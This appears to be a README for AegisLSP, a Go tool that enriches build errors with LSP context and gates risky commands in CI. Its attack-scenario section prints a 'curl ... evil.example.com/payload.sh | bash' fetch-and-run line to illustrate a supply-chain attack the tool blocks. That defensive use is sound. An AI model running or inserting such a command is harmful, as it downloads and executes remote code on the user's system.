# AegisLSP

**Semantic Terminal Interception Middleware** — intercept, enrich, and secure your build pipeline with LSP-powered intelligence.

[![Go 1.24+](https://img.shields.io/badge/Go-1.24+-00ADD8?logo=go&logoColor=white)](https://go.dev/)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Build Status](https://img.shields.io/github/actions/workflow/status/Uvean-z/aegislsp/ci.yml?branch=main)](https://github.com/Uvean-z/aegislsp/actions)
[![Release](https://img.shields.io/github/v/release/Uvean-z/aegislsp)](https://github.com/Uvean-z/aegislsp/releases)

---

AegisLSP wraps any CLI command (build, test, vet, etc.) and intercepts its stderr output in real time. It then enriches compiler errors with **LSP context** — go-to-definition, hover documentation, symbol info — and displays a structured, human-readable error report directly in your terminal.

Think of it as a **smart error post-processor** that turns cryptic compiler output into actionable diagnostics.

## Features

- **MCP Server** — Exposes AegisLSP as an [MCP (Model Context Protocol)](https://modelcontextprotocol.io/) tool, allowing LLM agents to invoke builds and receive structured, enriched error data over stdio.
- **Sandbox Approval Gate** — Classifies every command by risk level (low / medium / high / critical) and enforces approval policies. In headless environments (CI, pipes, containers), high-risk operations are auto-denied, preventing supply-chain attacks.
- **LSP Fusion Engine** — Correlates compiler errors with LSP diagnostics, enriches them with definitions, hover docs, and references, then deduplicates similar errors (up to 92% compression on cascading failures).
- **Semantic Caching** — Persists LSP results (definitions, hover info) to disk keyed by file content hash. Skips cold-start on subsequent runs and gracefully degrades when the LSP server is unavailable.
- **Docker Sandbox** — Optionally runs commands inside a disposable Docker container with `--read-only`, `--network=none`, `--cap-drop=ALL`, memory/CPU limits for full isolation.
- **Multi-Language Error Patterns** — Configurable regex patterns for Go, TypeScript, Python, and more via TOML config.

## Installation

### From Source

```bash
go install github.com/Uvean-z/aegislsp/cmd/aegislsp@latest
```

### From Releases

Download the latest binary for your platform from the [GitHub Releases](https://github.com/Uvean-z/aegislsp/releases) page.

Binaries are available for:
- Linux (amd64, arm64)
- macOS (amd64, arm64)
- Windows (amd64, arm64)

## Quick Start

### `aegis run` — Wrap Any Command

Run a build command through AegisLSP. Errors are intercepted, enriched with LSP context, and displayed in a structured format:

```bash
# Basic usage
aegis run -- go build ./...

# With semantic caching (skips gopls cold-start on cache hit)
aegis run --cache .aegis-cache.gob -- go build ./...

# With a custom config file
aegis run --config aegis.toml -- go test ./...

# Disable sandboxing (run directly)
aegis run --no-sandbox -- go vet ./...
```

### `aegis mcp` — MCP Server for LLM Integration

Start AegisLSP as an MCP server over stdio, enabling LLM agents to invoke builds and receive structured error data:

```bash
# Start MCP server
aegis mcp

# With semantic cache for faster responses
aegis mcp --cache .aegis-cache.gob

# With a custom config
aegis mcp --config aegis.toml
```

When running as an MCP server, AegisLSP exposes an `aegis_run` tool that accepts:
- `command` — the shell command to execute
- `work_dir` — working directory
- `timeout` — command timeout in seconds
- `use_sandbox` — whether to use Docker sandbox

## CI Guard — Prevent Supply-Chain Attacks

AegisLSP can protect your CI/CD pipeline from compromised build scripts and supply-chain attacks. The **Approval Gate** automatically detects headless environments (GitHub Actions, GitLab CI, piped input) and activates **auto-deny mode**: any high-risk or critical operation is blocked without prompting.

### How It Works

1. AegisLSP wraps your build/test commands in CI.
2. The Approval Gate classifies every command by risk level (30+ patterns).
3. In non-interactive environments, high-risk commands are auto-denied and the process exits with code 1.
4. Your cloud credentials and secrets remain safe — even if an attacker has tampered with a dependency.

### Example Attack Scenario

A compromised Go module injects a `go:generate` directive that runs:

```bash
curl -sL https://evil.example.com/payload.sh | bash
```

Without AegisLSP, this executes silently in CI. With AegisLSP, the Approval Gate classifies `curl | bash` as a critical-risk pattern, the headless auto-deny kicks in, and the CI step fails immediately.

### GitHub Actions Integration

Add AegisLSP to your workflow in two steps:

```yaml
- name: Install AegisLSP
  run: go install github.com/Uvean-z/aegislsp/cmd/aegislsp@latest

- name: Build with AegisLSP protection
  run: aegis run --no-sandbox -- go build ./...
```

See the full example in [`examples/github-ci-example.yml`](examples/github-ci-example.yml) or the ready-to-use workflow in [`.github/workflows/ci.yml`](.github/workflows/ci.yml).

## Configuration

AegisLSP is configured via a TOML file. Create a `aegis.toml`:

```toml
[sandbox]
enabled = true
type = "docker"          # "docker" or "none"
image = "golang:1.24-alpine"
timeout = 300
memory = "512m"
cpus = "1.0"

[approvals]
auto_approve = ["go build", "go test", "go vet"]
threshold = "medium"     # auto-deny above this risk level

[[error_patterns]]
language = "go"
regex = '^(?P<file>.+?):(?P<line>\d+):(?P<col>\d+): (?P<message>.+)$'
priority = 1

[[error_patterns]]
language = "typescript"
regex = '^(?P<file>.+?)\((?P<line>\d+),(?P<col>\d+)\): error TS\d+: (?P<message>.+)$'
priority = 2

[dedup]
enabled = true
window = 10              # consecutive error similarity window
```

## CLI Reference

```
aegis run [flags] -- <command> [args...]
aegis mcp [flags]
aegis version
aegis help
```

| Flag | Description | Default |
|------|-------------|---------|
| `--config <path>` | Path to TOML configuration file | — |
| `--sandbox-image <img>` | Docker image for sandbox | `golang:1.24-alpine` |
| `--no-sandbox` | Disable sandboxing | `false` |
| `--lsp <path>` | Path to LSP server binary | `gopls` |
| `--timeout <seconds>` | Command timeout | `300` |
| `--cache <path>` | Path to semantic cache file | — |

## Architecture

```
┌──────────────┐     ┌──────────────┐     ┌──────────────────┐
│  Interceptor │────▶│ FusionEngine │────▶│  Terminal Output │
│  (stderr     │     │ (LSP enrich  │     │  (structured,    │
│   parser)    │     │  + dedup)    │     │   colored)       │
└──────────────┘     └──────┬───────┘     └──────────────────┘
                            │
                     ┌──────┴───────┐
                     │   LSP Client │
                     │  (gopls via  │
                     │   stdio)     │
                     └──────────────┘
```

## License

[MIT](LICENSE)
